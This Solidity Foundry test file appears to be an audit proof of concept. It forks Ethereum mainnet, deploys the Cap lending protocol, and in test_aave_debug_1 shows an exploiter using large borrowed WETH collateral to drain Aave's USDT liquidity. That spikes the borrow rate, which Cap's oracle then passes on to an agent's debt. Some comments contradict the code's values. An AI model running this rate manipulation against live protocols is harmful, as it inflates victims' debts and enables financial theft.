// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import { Delegation } from "../../contracts/delegation/Delegation.sol";

import { FeeConfig, VaultConfig } from "../../contracts/deploy/interfaces/DeployConfigs.sol";
import { SymbioticNetworkAdapterParams } from "../../contracts/deploy/interfaces/SymbioticsDeployConfigs.sol";

import {
    SymbioticNetworkRewardsConfig,
    SymbioticUsersConfig,
    SymbioticVaultConfig
} from "../../contracts/deploy/interfaces/SymbioticsDeployConfigs.sol";
import {
    SymbioticAddressbook,
    SymbioticFactories,
    SymbioticRegistries,
    SymbioticServices,
    SymbioticUtils,
    VaultAddressbook
} from "../../contracts/deploy/utils/SymbioticUtils.sol";
import { IFeeReceiver } from "../../contracts/interfaces/IFeeReceiver.sol";
import { IMinter } from "../../contracts/interfaces/IMinter.sol";
import { IOracle } from "../../contracts/interfaces/IOracle.sol";
import { IPriceOracle } from "../../contracts/interfaces/IPriceOracle.sol";
import { Lender } from "../../contracts/lendingPool/Lender.sol";
import { MathUtils } from "../../contracts/lendingPool/libraries/math/MathUtils.sol";

import { IAaveDataProvider } from "../../contracts/interfaces/IAaveDataProvider.sol";
import { CapToken } from "../../contracts/token/CapToken.sol";
import { StakedCap } from "../../contracts/token/StakedCap.sol";
import "../deploy/TestDeployer.sol";
import { MockAaveDataProvider } from "../mocks/MockAaveDataProvider.sol";
import { MockChainlinkPriceFeed } from "../mocks/MockChainlinkPriceFeed.sol"; // import all
import { IVault } from "@symbioticfi/core/src/interfaces/vault/IVault.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { console } from "forge-std/console.sol";

contract ScenarioDebugTest is TestDeployer {
    using SafeERC20 for IERC20;
    using SafeERC20 for MockERC20;

    address old_cUSD = 0xF79e8E7Ba2dDb5d0a7D98B1F57fCb8A50436E9aA; // mainnet previous cUSD address deployment.

    address aavePoolV3 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; //mainnet use wrong adapter address. Here we fix using actual AaveProtocolDataProvider addresss
    address aaveDataProvider = 0x497a1994c46d4f6C864904A9f1fac6328Cb7C8a6; // AaveProtocolDataProvider mainnet address

    // TOKEN
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address PYUSD = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8; // Paypal USD 6 decimals
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    //CHAINLINK feed
    address USDC_CHAINLINK = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6; // Chainlink USDC/USD feed
    address USDT_CHAINLINK = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D; // Chainlink USDT/USD feed
    address PYUSD_CHAINLINK = 0x8f1dF6D7F2db73eECE86a18b4381F4707b918FB1; // Chainlink PYUSD/USD feed

    address exploiter = makeAddr("exploiter");

    /// FORKING MAINNET
    // Test follow deployment script as much as possible, only replace Mock Oracle with chainlink address, AAVE data provider with real mainnet protocol
    // Symbiotic use real mainnet address through manual typing address instead of editing config file.
    // No mock token, use USDC, USDT, PYUSD as per documents.
    // disable cETH vault due to protocol does not intended for cETH vault yet.
    // Lending activity still go through Symbiotic network and its operators.
    function setUp() public {
        // _deployCapTestEnvironment();
        // _initTestVaultLiquidity(usdVault); //@random user deposit 12000 USDC for each asset
        // _initSymbioticVaultsLiquidity(env); //@ WETH vault for symbiotic network rewards for restaker
        console.log("forking mainnet for debugging");
        // There was previous deployment on mainnet "cap-vaults-1.json", but deploy new one for fresh test
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 22940000);

        //copy deployments from   _deployCapTestEnvironment() and scripting.
        (env.users, env.testUsers) = _deployTestUsers();

        // // remove 28 days to move epoch back before constructor. So symbiotic Agent can deposit to vault
        // vm.warp(block.timestamp - 28 days);
        // vm.roll(block.number - 28 days / 12);

        /// DEPLOY Infrastructure
        {
            console.log("deploying infrastructure");
            vm.startPrank(env.users.deployer);

            // Ignore L2 and symbiotic vaults
            // lzAb = _getLzAddressbook();
            // symbioticAb = _getSymbioticAddressbook();
            // zapAb = _getZapAddressbook();

            env.implems = _deployImplementations();
            env.libs = _deployLibs();
            env.infra = _deployInfra(env.implems, env.users, 3 days); //3 days delegation from script

            // use actual USD address from mainnet
            env.usdMocks = new address[](3);
            env.usdMocks[0] = USDT;
            env.usdMocks[1] = USDC;
            env.usdMocks[2] = PYUSD; //@keep 33% split for fee between token

            env.ethMocks = new address[](1);
            env.ethMocks[0] = WETH;

            env.usdOracleMocks.chainlinkPriceFeeds = new address[](env.usdMocks.length);
            env.usdOracleMocks.chainlinkPriceFeeds[0] = USDT_CHAINLINK;
            env.usdOracleMocks.chainlinkPriceFeeds[1] = USDC_CHAINLINK;
            env.usdOracleMocks.chainlinkPriceFeeds[2] = PYUSD_CHAINLINK;
            env.usdOracleMocks.assets = new address[](env.usdMocks.length);
            env.usdOracleMocks.assets[0] = USDT;
            env.usdOracleMocks.assets[1] = USDC;
            env.usdOracleMocks.assets[2] = PYUSD;

            env.ethOracleMocks.chainlinkPriceFeeds = new address[](1);
            env.ethOracleMocks.chainlinkPriceFeeds[0] = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419; // Chainlink WETH/USD feed
            env.ethOracleMocks.assets = new address[](1);
            env.ethOracleMocks.assets[0] = WETH;

            console.log("deploying usdVault");
            env.usdVault = _deployVault(
                env.implems, env.infra, "Cap USD", "cUSD", env.usdOracleMocks.assets, env.users.insurance_fund
            );
            env.ethVault = _deployVault(
                env.implems, env.infra, "Cap ETH", "cETH", env.ethOracleMocks.assets, env.users.insurance_fund
            );
        }
        /// ACCESS CONTROL
        {
            console.log("deploying access control");
            vm.startPrank(env.users.access_control_admin);
            // setup staleness is missing from access control
            AccessControl(env.infra.accessControl).grantAccess(
                IPriceOracle.setStaleness.selector, env.infra.oracle, env.users.oracle_admin
            );
            _initInfraAccessControl(env.infra, env.users);
            _initVaultAccessControl(env.infra, env.usdVault, env.users);
            _initVaultAccessControl(env.infra, env.ethVault, env.users);
        }

        /// ORACLE
        {
            console.log("deploying oracle");
            vm.startPrank(env.users.oracle_admin);
            _initVaultOracle(env.libs, env.infra, env.usdVault); // Connect deployed cToken, stcToken to oracle chainlink
            _initVaultOracle(env.libs, env.infra, env.ethVault); // Connect deployed cToken, stcToken to oracle chainlink
            for (uint256 i = 0; i < env.usdVault.assets.length; i++) {
                address asset = env.usdVault.assets[i];
                address priceFeed = env.usdOracleMocks.chainlinkPriceFeeds[i];
                _initChainlinkPriceOracle(env.libs, env.infra, asset, priceFeed);
            }
            for (uint256 i = 0; i < env.ethOracleMocks.assets.length; i++) {
                address asset = env.ethOracleMocks.assets[i];
                address priceFeed = env.ethOracleMocks.chainlinkPriceFeeds[i];
                _initChainlinkPriceOracle(env.libs, env.infra, asset, priceFeed);
            }
            // @init staleness 1 days to bypass mainnet oracle issue
            uint staleness_time = 365 days; // when moving epoch, MAINNET chainlink oracle does not update new time.
            for (uint256 i = 0; i < env.usdVault.assets.length; i++) {
                IOracle(env.infra.oracle).setStaleness(env.usdVault.assets[i], staleness_time);
            }
            for (uint256 i = 0; i < env.ethVault.assets.length; i++) {
                IOracle(env.infra.oracle).setStaleness(env.ethVault.assets[i], staleness_time);
            }
            IOracle(env.infra.oracle).setStaleness(env.usdVault.capToken, staleness_time);
            IOracle(env.infra.oracle).setStaleness(env.usdVault.stakedCapToken, staleness_time);
            IOracle(env.infra.oracle).setStaleness(env.ethVault.capToken, staleness_time);
            IOracle(env.infra.oracle).setStaleness(env.ethVault.stakedCapToken, staleness_time);

            console.log("deploying rate oracle");
            vm.startPrank(env.users.rate_oracle_admin);
            for (uint256 i = 0; i < env.usdVault.assets.length; i++) {
                _initAaveRateOracle(env.libs, env.infra, env.usdVault.assets[i], aaveDataProvider);
            }
            for (uint256 i = 0; i < env.ethVault.assets.length; i++) {
                _initAaveRateOracle(env.libs, env.infra, env.ethVault.assets[i], aaveDataProvider);
            }
            for (uint256 i = 0; i < env.testUsers.agents.length; i++) {
                /// 0.05e27 is 5% per year
                uint256 increment = (i + 1) * 0.0001e27; // Vary the restakers rate by 1% each
                _initRestakerRateForAgent(env.infra, env.testUsers.agents[i], uint256(0.05e27 + increment)); // Restakers rate is annualized in ray
            }
        }

        /// LENDER FEE
        vm.startPrank(env.users.lender_admin);

        FeeConfig memory fee = FeeConfig({
            minMintFee: 0.005e27, // 0.5% minimum mint fee
            slope0: 0.0001e27,
            slope1: 0.1e27, //10% fee if single token liquidity > 33% of pool
            mintKinkRatio: 0.85e27,
            burnKinkRatio: 0.15e27,
            optimalRatio: 0.33e27
        });
        _initVaultLender(env.usdVault, env.infra, fee);
        _initVaultLender(env.ethVault, env.infra, fee);
        CapToken(env.usdVault.capToken).setRedeemFee(0.001e27); // 0.1%

        // SYMBIOTIC Delegators setup. replace only mainnet address no need to read from config
        {
            // symbioticAb = _getSymbioticAddressbook();
            // MAINNET ADDRESS https://docs.symbiotic.fi/deployments/mainnet
            symbioticAb = SymbioticAddressbook({
                factories: SymbioticFactories({
                    vaultFactory: 0xAEb6bdd95c502390db8f52c8909F703E9Af6a346,
                    delegatorFactory: 0x985Ed57AF9D475f1d83c1c1c8826A0E5A34E8C7B,
                    slasherFactory: 0x685c2eD7D59814d2a597409058Ee7a92F21e48Fd,
                    defaultStakerRewardsFactory: 0xFEB871581C2ab2e1EEe6f7dDC7e6246cFa087A23,
                    defaultOperatorRewardsFactory: 0x6D52fC402b2dA2669348Cc2682D85c61c122755D,
                    burnerRouterFactory: 0x99F2B89fB3C363fBafD8d826E5AA77b28bAB70a0
                }),
                registries: SymbioticRegistries({
                    networkRegistry: 0xC773b1011461e7314CF05f97d95aa8e92C1Fd8aA,
                    vaultRegistry: 0xAEb6bdd95c502390db8f52c8909F703E9Af6a346,
                    operatorRegistry: 0xAd817a6Bc954F678451A71363f04150FDD81Af9F
                }),
                services: SymbioticServices({
                    networkMetadataService: 0x0000000000000000000000000000000000000000, // unused
                    networkMiddlewareService: 0xD7dC9B366c027743D90761F71858BCa83C6899Ad,
                    operatorMetadataService: 0x0000000000000000000000000000000000000000, // unused
                    vaultOptInService: 0xb361894bC06cbBA7Ea8098BF0e32EB1906A5F891,
                    networkOptInService: 0x7133415b33B438843D581013f98A08704316633c,
                    vaultConfigurator: 0x29300b1d3150B4E2b12fE80BE72f365E200441EC
                })
            });
            console.log("deploying symbiotic cap network address");
            env.symbiotic.users.vault_admin = makeAddr("vault_admin");

            console.log("deploying symbiotic network adapter");
            vm.startPrank(env.users.deployer);
            env.symbiotic.networkAdapterImplems = _deploySymbioticNetworkAdapterImplems();
            env.symbiotic.networkAdapter = _deploySymbioticNetworkAdapterInfra(
                env.infra,
                symbioticAb, //@use vault registry
                env.symbiotic.networkAdapterImplems,
                SymbioticNetworkAdapterParams({ vaultEpochDuration: 7 days, feeAllowed: 1000 })
            );

            console.log("registering delegation network");
            vm.startPrank(env.users.delegation_admin);
            _registerNetworkForCapDelegation(env.infra, env.symbiotic.networkAdapter.networkMiddleware);

            console.log("access control mgmt");
            vm.startPrank(env.users.access_control_admin);
            _initSymbioticNetworkAdapterAccessControl(env.infra, env.symbiotic.networkAdapter, env.users);

            console.log("registering symbiotic network");
            vm.startPrank(env.users.middleware_admin);
            _registerCapNetwork(symbioticAb, env.symbiotic.networkAdapter); //@networkMiddlewareService

            console.log("registering agents as operator");
            for (uint256 i = 0; i < env.testUsers.agents.length; i++) {
                vm.startPrank(env.testUsers.agents[i]);
                _agentRegisterAsOperator(symbioticAb); //operatorRegistry
                _agentOptInToSymbioticNetwork(symbioticAb, env.symbiotic.networkAdapter); //networkOptInService
            }

            console.log("init agent delegation for symbiotic network");
            vm.startPrank(env.users.delegation_admin);
            for (uint256 i = 0; i < env.testUsers.agents.length; i++) {
                address agent = env.testUsers.agents[i];
                _addAgentToDelegationContract(env.infra, agent, env.symbiotic.networkAdapter.networkMiddleware);
            }

            console.log("deploying symbiotic WETH vault");
            (SymbioticVaultConfig memory _vault, SymbioticNetworkRewardsConfig memory _rewards) =
                _deployAndConfigureTestnetSymbioticVault(env.ethMocks[0], "WETH");
            _symbioticVaultConfigToEnv(_vault);
            _symbioticNetworkRewardsConfigToEnv(_rewards);

            vm.stopPrank();
        }
        // // change  epoch
        // vm.warp(block.timestamp + 28 days);
        // vm.roll(block.number + 28 days / 12);

        // LABELS
        _unwrapEnvToMakeTestsReadable();
        _applyTestnetLabels();

        vm.stopPrank();
    }

    function _setAAVEdataProviderPrice(address asset, uint256 variableBorrowRate) internal {
        vm.startPrank(env.users.oracle_admin);
        for (uint256 i = 0; i < env.usdOracleMocks.chainlinkPriceFeeds.length; i++) {
            if (env.usdOracleMocks.assets[i] == asset) {
                MockAaveDataProvider(env.usdOracleMocks.aaveDataProviders[i]).setVariableBorrowRate(variableBorrowRate);
                return;
            }
        }

        for (uint256 i = 0; i < env.ethOracleMocks.chainlinkPriceFeeds.length; i++) {
            if (env.ethOracleMocks.assets[i] == asset) {
                MockAaveDataProvider(env.ethOracleMocks.aaveDataProviders[i]).setVariableBorrowRate(variableBorrowRate);
                return;
            }
        }
        vm.stopPrank();

        revert("Asset not found");
    }

    function getPrice(address asset) public view returns (uint256 price) {
        (price,) = IOracle(env.infra.oracle).getPrice(asset);
    }

    function getAAVEBorrowMarketPrice(address asset) public view returns (uint256 variableBorrowRate) {
        (,,,,,, variableBorrowRate,,,,,) = IAaveDataProvider(aaveDataProvider).getReserveData(asset);
        return variableBorrowRate;
    }

    function debugAgent(address agent) internal view {
        (
            uint256 totalDelegation,
            uint256 totalSlashableCollateral,
            uint256 totalDebt,
            uint256 ltv,
            uint256 liquidationThreshold,
            uint256 health
        ) = lender.agent(agent);
        console.log("-- Agent %s", agent);
        console.log("Total Delegation: %e", totalDelegation);
        console.log("Total Slashable Collateral: %e", totalSlashableCollateral);
        console.log("Total Debt: %e", totalDebt); //@in 8 decimals
        console.log("Health: %e", ltv);
        console.log("");
    }

    /// @dev init vault with liquidity for all assets, stake single asset
    function setupTestVault(VaultConfig memory vault, address user, uint256 stakedCapTokenAmount) internal {
        // init the vault with some assets
        vm.deal(user, 100 ether);

        CapToken capToken = CapToken(vault.capToken);
        StakedCap stakedCapToken = StakedCap(vault.stakedCapToken);

        uint256 capTokenAmount = stakedCapTokenAmount * 10 ** capToken.decimals() / 10 ** stakedCapToken.decimals();

        vm.startPrank(user);
        for (uint256 i = 0; i < vault.assets.length; i++) {
            IERC20 asset = IERC20(vault.assets[i]);
            uint256 amount = capTokenAmount * 10 ** MockERC20(address(asset)).decimals() / 10 ** capToken.decimals();
            deal(address(asset), user, amount);
            asset.forceApprove(address(capToken), amount);
            capToken.mint(address(asset), amount, 0, user, block.timestamp + 1 hours);
        }
        capToken.transfer(user, capTokenAmount);

        capToken.approve(vault.stakedCapToken, capTokenAmount);
        stakedCapToken.deposit(capTokenAmount, user);

        stakedCapToken.transfer(user, stakedCapTokenAmount);
        vm.stopPrank();
    }

    function test_aave_debug_1() public {
        // vault init with 10_000 USD for each type of token.
        setupTestVault(usdVault, makeAddr("random_user1"), 10_000e18); // 10_000 USD for each stable token

        {
            console.log("--- SETUP AGENT SYMBIOTIC ---");
            //setup Operator lending from vault with 25000 USD
            address user_agent = env.testUsers.agents[0];

            // @limit how much agent can borrow. Cap maximum total borrow ETH value to 10 ETH
            // vm.startPrank(env.symbiotic.users.vault_admin);
            // _symbioticVaultDelegateToAgent(symbioticWethVault, env.symbiotic.networkAdapter, user_agent, 10e18); //10 ETH limit?
            // vm.stopPrank();

            // provide vault deposit for restaker. So operator have collateral to borrow against.
            //Copy from InitSymbioticVaultLiquidity.sol
            //since there is single vault for symbiotic network. Just deposit 10_000 WETH into it.
            // console.log("vault collateral address:", env.symbiotic.collaterals[0]); //WETH address

            require(env.symbiotic.collaterals[0] == WETH, "Symbiotic collateral is not WETH");
            //only restaker can mint and stake in symbiotic vault
            address restaker = env.testUsers.restakers[0];
            address collateral = env.symbiotic.collaterals[0];
            address vault = env.symbiotic.vaults[0];
            uint collateral_amount = 10_000e18; // 10_000 WETH to deposit into vault
            require(vault.code.length != 0, "Symbiotic vault not deployed");
            vm.startPrank(restaker);
            deal(collateral, restaker, collateral_amount);
            IERC20(collateral).forceApprove(vault, type(uint).max);

            (uint256 depositedAmount, uint256 mintedShares) = IVault(vault).deposit(restaker, collateral_amount);
            console.log("restaker deposited %e WETH into vault", depositedAmount);
            console.log("restaker minted %e shares", mintedShares);

            _timeTravel(28 days); // move epoch to next 28 days. allow coverage to exist
            debugAgent(user_agent);

            vm.startPrank(user_agent);
            console.log("USDT maxBorrowable: %e", lender.maxBorrowable(user_agent, USDT));
            console.log("USDC maxBorrowable: %e", lender.maxBorrowable(user_agent, USDC));
            console.log("PYUSD maxBorrowable: %e", lender.maxBorrowable(user_agent, PYUSD));
            lender.borrow(USDT, 5_000e6, user_agent);
            lender.borrow(USDT, 5_000e6, user_agent);
            debugAgent(user_agent);
            // lender.borrow(USDC, 7.136905945e9, user_agent);
            // debugAgent(user_agent);
            // lender.borrow(PYUSD, 7_000e6, user_agent);
            // debugAgent(user_agent);
        }
        {
            console.log("----");
            console.log("USDT borrow rate: %e", getAAVEBorrowMarketPrice(USDT));
            // console.log("USDC borrow rate: %e", getAAVEBorrowMarketPrice(USDC));
            // console.log("PYUSD borrow rate: %e", getAAVEBorrowMarketPrice(PYUSD));
            console.log("WETH borrow rate: %e", getAAVEBorrowMarketPrice(WETH));

            console.log("");
            console.log("cap USDT utilization rate: %e", IOracle(env.infra.oracle).utilizationRate(USDT));
            // console.log("cap USDC utilization rate: %e", IOracle(env.infra.oracle).utilizationRate(USDC));
            // console.log("cap PYUSD utilization rate: %e", IOracle(env.infra.oracle).utilizationRate(PYUSD));

            // rate here should be aave rate + util rate.
            console.log("cap USDT borrow rate: %e", IOracle(env.infra.oracle).marketRate(USDT));
            // console.log("cap USDC borrow rate: %e", IOracle(env.infra.oracle).marketRate(USDC));
            // console.log("cap PYUSD borrow rate: %e", IOracle(env.infra.oracle).marketRate(PYUSD));
            // cache interest rate index with normal 5% rate.
        }

        // simulate normal debt with current interest rate before exploit
        vm.warp(block.timestamp + 3 days);
        uint cache_totaldebt = lender.debt(env.testUsers.agents[0], USDT);
        vm.warp(block.timestamp - 3 days);

        {
            console.log("\n-- EXPLOITER push AAVE rate --");
            // Abuse AAVE system to increase borrow rate to maximum
            vm.startPrank(exploiter);
            // flash loan collateral with 0% zero interest rate from Balancer Vault
            // Or other protocol to get enough collateral asset. there should be no fee involved.
            uint collateralAmount = 500_000 ether; // 1B USD$ to borrow.
            deal(WETH, exploiter, collateralAmount);
            uint start_USDT = 1e6;
            deal(USDT, exploiter, start_USDT); // small amount of cash
            // find out how much aave pool is borrowed.
            (
                uint unbacked,
                ,
                uint totalAToken,
                uint totalStableDebt,
                uint totalVariableDebt,
                uint liquidityRate,
                uint variableBorrowRate,
                ,
                ,
                ,
                ,
            ) = IAaveDataProvider(aaveDataProvider).getReserveData(USDT);
            // console.log("AAVE pool borrowed: %e", totalVariableDebt + totalStableDebt);
            // console.log("AAVE pool unbacked: %e", unbacked);
            // console.log("AAVE pool total aToken: %e", totalAToken);
            // console.log("AAVE pool liquidity rate: %e", liquidityRate);
            console.log("AAVE pool variable borrow rate: %e", variableBorrowRate);
            uint availableBorrow = totalAToken - (totalVariableDebt + totalStableDebt);
            console.log("AAVE pool available borrow: %e", availableBorrow);
            //deposit collateral
            IERC20(WETH).approve(aavePoolV3, type(uint).max);
            (bool succeed,) = aavePoolV3.call(
                abi.encodeWithSignature(
                    "supply(address,uint256,address,uint16)",
                    WETH,
                    collateralAmount,
                    exploiter,
                    0 // referral code
                )
            );
            require(succeed, "AAVE supply failed");
            //borrow maximum amount
            (succeed,) = aavePoolV3.call(
                abi.encodeWithSignature(
                    "borrow(address,uint256,uint256,uint16,address)",
                    USDT,
                    availableBorrow,
                    2, // interestRateMode
                    0, // referral code
                    exploiter
                )
            );
            require(succeed, "AAVE borrow failed");
            console.log("\n-- EXPLOITER refresh DebtToken index rate --");
            _timeTravel(1); // can only refresh when update time and interest is non zero
            //@ refresh new borrow rate to oracle. This can bypass by going through repay function realize interest for restaker
            IERC20(USDT).safeTransfer(address(middleware), 1); //Distribute rewards require middleware have some asset balance for Staker
            lender.realizeRestakerInterest(env.testUsers.agents[0], USDT); //going through repay does not work with minimum 100 USD repay

            //get borrow rate
            (unbacked,, totalAToken, totalStableDebt, totalVariableDebt, liquidityRate, variableBorrowRate,,,,,) =
                IAaveDataProvider(aaveDataProvider).getReserveData(USDT);

            console.log("AAVE pool borrow rate after exploit: %e", variableBorrowRate);
            // console.log("AAVE pool total stable debt: %e", totalStableDebt);
            // console.log("AAVE pool total variable debt: %e", totalVariableDebt);
            // console.log("AAVE pool total borrowed: %e", totalStableDebt + totalVariableDebt);

            console.log("cap USDT new borrow rate: %e", IOracle(env.infra.oracle).marketRate(USDT));

            //Repay the borrowing without any cost
            IERC20(USDT).forceApprove(aavePoolV3, type(uint).max);
            (succeed,) = aavePoolV3.call(
                abi.encodeWithSignature(
                    "repay(address,uint256,uint256,address)",
                    USDT,
                    availableBorrow, // repay all
                    2, //interestRateMode
                    exploiter
                )
            );
            require(succeed, "AAVE repay failed");
            require(IERC20(USDT).balanceOf(exploiter) < start_USDT, "Exploiter should gain no USDT");
            //withdraw aave and refund collateral for flashloan with 0% fee.
        }

        {
            //@ There is no way to read/view current DebtToken interest rate. It is reflected in index(). so must use time forward to see how interest rate behave.
            //debug agent debt
            address agent = env.testUsers.agents[0];

            console.log("-- POST FLASH EXPLOIT && 1 years --");
            // normal interest rate is ~5%
            console.log("normal totalDebt after 1 years: %e", cache_totaldebt); //@in 8 decimals
            _timeTravel(3 days);
            //but real interest rate is maximum 19%. with broken utilization rate it increase to 38%
            console.log("new totalDebt after 1 years: %e", lender.debt(agent, USDT)); //@in 8 decimals

            // current oracle rate does not change, it still read from AAVE
            console.log("cap USDT utilization rate: %e", IOracle(env.infra.oracle).utilizationRate(USDT));            
            console.log("cap USDT borrow rate: %e", IOracle(env.infra.oracle).marketRate(USDT));

            require(
                lender.debt(agent, USDT) > cache_totaldebt, "Exploited Debt should increase significantly after 1 years"
            );
        }
    }
}
